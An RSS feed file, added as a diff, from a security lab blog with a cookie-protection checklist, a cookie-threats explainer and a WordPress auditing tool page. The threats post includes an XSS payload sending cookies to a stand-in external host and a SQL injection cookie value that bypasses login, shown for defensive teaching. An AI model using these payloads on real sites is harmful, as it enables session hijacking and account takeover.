@@ -1,0 +1,282 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Portcullis Labs &#187; DMG</title>
+	<atom:link href="https://labs.portcullis.co.uk/author/dmg/feed/" rel="self" type="application/rss+xml" />
+	<link>https://labs.portcullis.co.uk</link>
+	<description>Research and Development</description>
+	<language>en-US</language>
+		<sy:updatePeriod>hourly</sy:updatePeriod>
+		<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>http://wordpress.org/?v=3.8.5</generator>
+	<item>
+		<title>Keep your cookies safe (part 2)</title>
+		<link>https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-2/</link>
+		<comments>https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-2/#comments</comments>
+		<pubDate>Thu, 15 Feb 2018 20:31:26 +0000</pubDate>
+		<dc:creator><![CDATA[DMG]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[phishing]]></category>
+		<category><![CDATA[SDL]]></category>
+		<category><![CDATA[training]]></category>
+		<category><![CDATA[web]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=3960</guid>
+		<description><![CDATA[<p>In the first blog post we talked about the dangers that your cookies are exposed. Now it is time to keep your cookies safe. Time to know what protection mechanisms there are, how to use them and why. How to read this post? The flowchart below will guide you to the process to check if [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-2/">Keep your cookies safe (part 2)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>In the <a title="first blog post" href="/blog/keep-your-cookies-safe-part-1/">first blog post</a> we talked about the dangers that your cookies are exposed. Now it is time to keep your cookies safe. Time to know what protection mechanisms there are, how to use them and why.<span id="more-3960"></span></p>
+<h2>How to read this post?</h2>
+<p>The flowchart below will guide you to the process to check if your cookies are well protected. Note that there are more factors and cases that could potentially compromise your cookies (as we talked in the part 1 of the blog post).</p>
+<p>Of course at the end of the post you will find the explanation to the flowchart. So if you do not understand anything, do not panic! Look for the question in the last part of the blog where it will be explained.</p>
+<div id="attachment_3964" style="width: 466px" class="wp-caption aligncenter"><a name="imageclose-3961"><div class="lb-album"><a href="#image-3961"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2014/02/cookies_flowchart-456x1024.png" alt="flowchart about securing cookies" class="size-large wp-image-3964  "><span></span></a></div>              
+<a href="#imageclose-3961" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-3961">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2014/02/cookies_flowchart.png" alt="image-3961">
+                   </div></a><p class="wp-caption-text">A flowchart about how to get your cookies better secured.</p></div>
+<h3>Is your session cookie different before and after login?</h3>
+<ul>
+<li>Correct answer: Yes, if your unique session ID cookie is different after and before login, your session is correctly protected against Session Fixation attacks</li>
+<li>Incorrect answer: No, your unique session ID cookie is the same, if an attacker managed to stole your cookie before login into the web application, then once you are authenticated the attacker could also access the application</li>
+</ul>
+<p>Recommendation: Session ID should be changed after and before user logs in.</p>
+<h3>Are you invalidating the session when the user logs out?</h3>
+<ul>
+<li>Correct answer: Yes, once the user has logged out, the session must be destroyed or invalidated</li>
+<li>Incorrect answer: No, if you do not destroy the session ID in server side, the session will continue being valid</li>
+</ul>
+<p>Recommendation: Session must be invalidated after the user logs out.</p>
+<h3>Does your cookie have the attribute &#8220;HttpOnly&#8221;?</h3>
+<ul>
+<li>Correct answer: Yes, your cookie is only accessible via http and not via JavaScript</li>
+<li>Incorrect answer: No, your cookie is also accessible via JavaScript , which in case of an attacker compromise your application with a Cross-site Scripting, it could access to your cookie</li>
+</ul>
+<p>Recommendation: Set the cookie as &#8220;HttpOnly&#8221;.</p>
+<h3>Does your cookie have the full domain attribute set?</h3>
+<ul>
+<li>Correct answer: Yes, your cookie is only being sent to the correct domain where it is needed</li>
+<li>Incorrect answer: No, your cookie can be sent to the multiple sub-domains you could have</li>
+</ul>
+<p>Recommendation: The full domain of the cookie must be specified.</p>
+<h3>Does your cookie have an adequate lifetime?</h3>
+<ul>
+<li>Correct answer: Yes</li>
+<li>Incorrect answer: No, Cookies with an excessive lifetime will not be deleted when the user closes their browser and would therefore be exposed should an attacker manage to compromise the user&#8217;s system</li>
+</ul>
+<p>Recommendation: Use cookies without a lifetime so that they are deleted once the user closes their browser or lower its lifetime to meet business requirements.</p>
+<h3>Do you have only one web application in the same domain?</h3>
+<p>What does this question mean? The following is an example of multiple web applications in the same domain:</p>
+<ul>
+<li>www.mydomain.com/app1</li>
+<li>www.mydomain.com/app2</li>
+<li>www.mydomain.com/app3</li>
+</ul>
+<p>There is not a correct answer to this question.</p>
+<p>If you only have one application running over the same domain, you should not need to care about this issue. However if you host multiple web applications, you need to set the attribute &#8220;path&#8221; of the cookie to ensure that the cookie is only being sent to the web application it belongs.</p>
+<h3>Are your cookies NOT storing sensitive information?</h3>
+<ul>
+<li>Correct answer: Yes, my cookies do not contains sensitive information</li>
+<li>Incorrect answer: No, there are some sensitive information in the cookies</li>
+</ul>
+<p>Recommendation: Ensure that sensitive information is not stored in the cookies.</p>
+<h3>Does your web application support HTTPS?</h3>
+<p>If the answer to this question is NO, you are sending all the data through a plain text protocol. An attacker able to intercept network traffic between a user&#8217;s session and the web server could capture the sensitive data being transmitted.</p>
+<p>If the answer is YES, there is some other question you need to answer before know if you are protecting correctly your cookies:</p>
+<h3>Does your web application use HTTP + HTTPS (mixed content)?</h3>
+<p>If the answer is NO, it means that HTTP is not allowed and all the data is being sent over HTTPS. Although your cookie is secure in this case, you need to be careful if you enable HTTP.</p>
+<p>If the answer is YES you need to answer one more question:</p>
+<h3>Is HSTS (HTTP Strict Transport Security) enabled or has the cookie the attribute &#8220;secure&#8221;?</h3>
+<p>If you have HSTS enabled, you are forcing all the data being sent over HTTPS (cookies included).</p>
+<p>If the cookie has the attribute &#8220;secure&#8221;, you are forcing the cookie to be sent <strong>only</strong> over HTTPS.</p>
+<p>Recommendation: Set the cookie as &#8220;secure&#8221; and consider to enable HSTS.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-2/">Keep your cookies safe (part 2)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-2/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Keep your cookies safe (part 1)</title>
+		<link>https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-1/</link>
+		<comments>https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-1/#comments</comments>
+		<pubDate>Fri, 22 Apr 2016 15:03:32 +0000</pubDate>
+		<dc:creator><![CDATA[DMG]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[phishing]]></category>
+		<category><![CDATA[SDL]]></category>
+		<category><![CDATA[training]]></category>
+		<category><![CDATA[web]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=3605</guid>
+		<description><![CDATA[<p>What are cookies and why are they important? A cookie is a small piece of data sent from a web site and stored in a user&#8217;s web browser and is subsequently includes with all authenticated requests that belong to that session. Some cookies contain the user session data in a web site, which is vital. [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-1/">Keep your cookies safe (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>What are cookies and why are they important?<span id="more-3605"></span></p>
+<p>A cookie is a small piece of data sent from a web site and stored in a user&#8217;s web browser and is subsequently includes with all authenticated requests that belong to that session. Some cookies contain the user session data in a web site, which is vital. Others cookies are used for tracking long-term records of an individuals browsing history and preferences such as their preferred language. Sometimes they are also used for tracking and monitoring a user&#8217;s activities across different web sites.</p>
+<p>Due to the fact that HTTP is a stateless protocol, the web site needs a way to authenticate the user in each request. Every time the user visits a new page within a web site, the browser sends the users cookie back to the server, allowing the server to serve the correct data to that individual user, which is tracked using a session ID. Cookies therefore play an integral part in ensuring persistence of data used across multiple HTTP requests throughout the time a user visits a web site.</p>
+<p>What does a cookie look like?</p>
+<pre class="brush: php; gutter: false; title: ; notranslate">
+Set-Cookie: __cfduid=d8a3ae94f81234321; expires=Mon, 23-Dec-2019 23:50:00 GMT; path=/; domain=.domain.com; HttpOnly
+</pre>
+<p>The cookie below is an example of a common cookie generated for WordPress. Here we break down each part of the cookie and explain what it is used for:</p>
+<ul>
+<li>Set-Cookie &#8211; the web server asks the browser to save the cookie with this command</li>
+<li>__cfduid=d8a3ae94f81234321;: This is the cookie itself. At the left of the equals symbol is the name of the cookie and to the right is its value</li>
+<li>expires=Mon, 23-Dec-2019 23:50:00 GMT; &#8211; this is the date and time when the cookie will expire</li>
+<li>path=/; domain=.domain.com; &#8211; the cookie domain and path define the scope of the cookie. They tell the browser that cookies should only be sent back to the server for the given domain and path</li>
+<li>HttpOnly &#8211; this attribute (without a value associated) tells the browser that JavaScript cannot be used to access the cookie, which must only be accessed through HTTP or HTTPS. Sometimes you will also see the attribute &#8220;Secure&#8221;, which prevents the cookie being sent over the unencrypted HTTP protocol (i.e. the cookie will only be transmitted over HTTPS)</li>
+</ul>
+<p>What is the impact of having your cookies compromised?</p>
+<p>A traditional and important role of a cookie is to store a users session ID, which is used to identify a user. If this type of cookie is stolen by a malicious user, they would be able to gain access to web site as the user for which the cookie belonged to (i.e. the malicoius user would have access to your account within the web site).</p>
+<p>In the case of the tracking cookie, the malicious user would have access to your browsing history for the web site.</p>
+<p>Another problem arises when sensitive data is stored in cookies, for example a username, and this is also a vector for server side exploitation if its contents are not properly validated, which can potentially lead to serious vulnerabilties such as SQL Injection or remote code execution.</p>
+<p>What are the main cookie threats?</p>
+<div id="attachment_3785" style="width: 310px" class="wp-caption aligncenter"><a href="http://www.flickr.com/photos/somegeekintn/" target="_blank"><img class="size-medium wp-image-3785  " title="Cookie Monster" alt="cookie monster image" src="https://labs.portcullis.co.uk/wp-content/uploads/2014/02/cookie_monster-300x198.jpg" width="300" height="198" /></a><p class="wp-caption-text">Cookie Monster.</p></div>
+<p>There are different attacking vectors in which obtaining and modifying cookies can occur, leading to session hijacking of an authenticated user session, or even SQL injection attacks against the server. These threats may take place when an attacker takes control of the web browser using Cross-site Scripting, or Spyware, in order to obtain a users SessionID cookie that can then be used by an attacker to impersonate the legitimate user, as shown in the following example:</p>
+<p>Obtaining access to the cookie can be as easy as using the following JavaScript line:</p>
+<pre class="brush: jscript; gutter: false; title: ; notranslate">
+document.cookie
+</pre>
+<p>Imagine that the web site has a search form that is vulnerable to Cross-site Scripting (Reflective Cross-site Scripting in this case). </p>
+<pre class="brush: plain; gutter: false; title: ; notranslate">
+
+http://myweb.com/form.php?search=XSS_PAYLOAD_HERE
+
+</pre>
+<p>An attacker could use the following payload to send the cookie to an external web site:</p>
+<pre class="brush: xml; gutter: false; title: ; notranslate">
+&amp;lt;script&amp;gt;location.href='http://external_web site.com/cookiemonster.php?c00kie='+escape(document.cookie);&amp;lt;/script&amp;gt;
+</pre>
+<p>The final step would be to send the vulnerable link to an admin and wait for them to click on it. If the attacker uses an URL shortener, this allows for further obfuscation of the malicous URL, as the admin will be unable to see the content of the link they have been sent.</p>
+<p>An attacker able to read files from a given user may also attempt to retrieve the cookies stored in files from a system. Furthermore some browsers store  persistent cookies in a binary file that is easily readable with existing <a title="public tools" href="http://securitylearn.net/wp-content/uploads/tools/iOS/BinaryCookieReader.py">public tools</a>.</p>
+<p>Security weaknesses may also reside server side when cookies are modified, if input validation routines are not adequately implemented. The example below shows how to bypass the authentication process:</p>
+<pre class="brush: php; gutter: false; title: ; notranslate">
+//In /core/user.php: (cs cart vulnerability)
+
+if (fn_get_cookie(AREA_NAME . '_user_id')) {
+ $udata = db_get_row(&quot;SELECT user_id, user_type, tax_exempt, last_login, membership_status, membership_id FROM $db_tables[users]
+ WHERE user_id='&quot;.fn_get_cookies(AREA_NAME . '_user_id').&quot;' AND password='&quot;.fn_get_cookie(AREA_NAME . '_password').&quot;'&quot;);
+ fn_define('LOGGED_VIA_COOKIE', true);
+
+}
+
+//Cookie: cs_cookies[customer_user_id]=1'/*;
+</pre>
+<p>For their role, cookies are really important and may be used in different attacks.</p>
+<p>Now that you are more aware of the dangers, it would be wise to ensure steps are taken to deploy web site cookies safely and securely. Look out for the second part of this post!</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-1/">Keep your cookies safe (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-1/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>WordPress Build Review</title>
+		<link>https://labs.portcullis.co.uk/tools/wordpress-build-review/</link>
+		<comments>https://labs.portcullis.co.uk/tools/wordpress-build-review/#comments</comments>
+		<pubDate>Fri, 14 Feb 2014 12:50:30 +0000</pubDate>
+		<dc:creator><![CDATA[DMG]]></dc:creator>
+				<category><![CDATA[Tools]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[training]]></category>
+		<category><![CDATA[wordpress]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=3362</guid>
+		<description><![CDATA[<p>WordPress Build Review is a tool to check the basic security settings in a WordPress installation. Key features Checks the WordPress version Checks the WordPress plugins versions Checks WordPress minor updates are enabled Checks the WordPress configuration Checks the theme configuration Identifies the presence of backup files in web folder Checks the Anti-Virus Checks the [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/tools/wordpress-build-review/">WordPress Build Review</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>WordPress Build Review is a tool to check the basic security settings in a WordPress installation.<span id="more-3362"></span></p>
+<h2>Key features</h2>
+<ul>
+<li>Checks the WordPress version</li>
+<li>Checks the WordPress plugins versions</li>
+<li>Checks WordPress minor updates are enabled</li>
+<li>Checks the WordPress configuration</li>
+<li>Checks the theme configuration</li>
+<li>Identifies the presence of backup files in web folder</li>
+<li>Checks the Anti-Virus</li>
+<li>Checks the file and directory permissions</li>
+<li>Checks HTTPS in admin panel is enabled</li>
+</ul>
+<h2>Overview</h2>
+<p>WordPress-build-review checks the basic security configuration that a WordPress installation should have.</p>
+<p>The idea of this tool is to perform a build review on WordPress installations. This tool should works with the default installed software in a Linux distribution.</p>
+<p>This tool was developed and tested in Linux. However, it should also work on other POSIX alike platforms as long as the dependencies (GNU utils) are available. Please let us know if you try running this tool in other platforms, your feedback is appreciated.</p>
+<h2>Installation</h2>
+<p>Download the tool from the link below and uncompress it.</p>
+<p>Make sure you have the tools `curl&#8217; and `bc&#8217; installed in your system.</p>
+<h2>Usage</h2>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ ./wordpress-build-review.sh /full/path/to/wordpress/root/folder/
+...
+Starting wordpress-build-review v1.0 at Fri Jan 31 16:19:53 GMT 2014
+
+by David Muñoz ( dmg@portcullis-security.com )
+
+This tool checks the basic security configuration that a wordpress installation
+should have.
+
+Use of this script is only permitted on systems which you have been granted
+legal permission to perform a security assessment of. Apart from this
+condition the GPL v2 applies.
+
+Search the output below for the word '[VV]' for the security issues found.
+If you don't see it then this script didn't find any problems.
+Search the output below for the word '[WW]' for problems occurred during script
+execution. These problems must be checked manually.
+Finally search the output below for the word '[II]' for correct issues.
+...
+</pre>
+<h2>Examples</h2>
+<p>Here we can see some example issues that the tool is able to identify:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ ./wordpress-build-review.sh /var/www/wordpress | grep &quot;[VV]&quot;
+...
+[VV][001]File wp-login.php found. It is recommended to change its name.
+[VV][002]File readme.html found. It is recommended to delete it.
+[VV][005]The wordpress version installed is out-to-date. Installed version is: 3.8. Last version is: 3.8.1.
+[VV][006]Plugin 6scan-protection is out-of-date. Please, update it. Installed version is: 3.0.5. Last version is: 3.0.6.
+[VV][009]HTTPS on the LOGIN and ADMIN sections are not enabled in wp-config but SSL may still being enforced by the web server config.
+[VV][015]File /var/www/wordpress/test.bak found, consider to remove it.
+[VV][015]File /var/www/wordpress/wp-config.php~ found, consider to remove it.
+[VV]Default or backup files found, please remove them.
+[VV][012]The file /var/www/wordpress/wp-config.php~ has 664 permissions, consider to set it to 644 or 640
+[VV]Incorrect file permissions, please correct them.
+[VV][013]The folder /var/www/wordpress/wp-content/plugins/test has 775 permissions, consider to set it to 755 or 750
+[VV]Incorrect folder permissions, please correct them.
+[VV][010]Wordpress table prefix is set by default &lt;wp_&gt;. Please, consider to change it.
+[VV][008]Wordpress database user is root, please change it.
+...
+</pre>
+<div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-1').click();">
+  <div class="icon"><a href="https://labs.portcullis.co.uk/download/wordpress-build-review_v1.0.tar.gz" target="_blank" title="Download Wordpress-build-review V1.0 Tar"><img align="middle" src="https://labs.portcullis.co.uk/wp-includes/images/crystal/archive.png" alt="Wordpress-build-review V1.0 Tar" /></a></div>
+  <div class="filetitle">
+    <a href="https://labs.portcullis.co.uk/download/wordpress-build-review_v1.0.tar.gz" title="Download wordpress-build-review_v1.0.tar.gz" target="_blank" id="wpfb-file-link-1">wordpress-build-review_v1.0.tar.gz</a>
+    
+    <br />
+    February 17, 2014<br />
+    
+  </div>
+  <div class="info">
+    5.2 KiB<br />
+    MD5 hash: 4a6072f4c13478a8707275fd3c17c9f7 <br />
+    <a href="#" onclick="return wpfilebase_filedetails(1);">Details</a>
+  </div>
+  <div class="details" id="wpfilebase-filedetails1" style="display: none;">
+  
+  <table border="0">
+   
+   
+   
+   
+   
+   
+   <tr><td><strong>Date:</strong></td><td>February 17, 2014</td></tr>
+  </table>
+  </div>
+ <div style="clear: both;"></div>
+</div>
+<p>The post <a href="https://labs.portcullis.co.uk/tools/wordpress-build-review/">WordPress Build Review</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/tools/wordpress-build-review/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+	</channel>
+</rss>
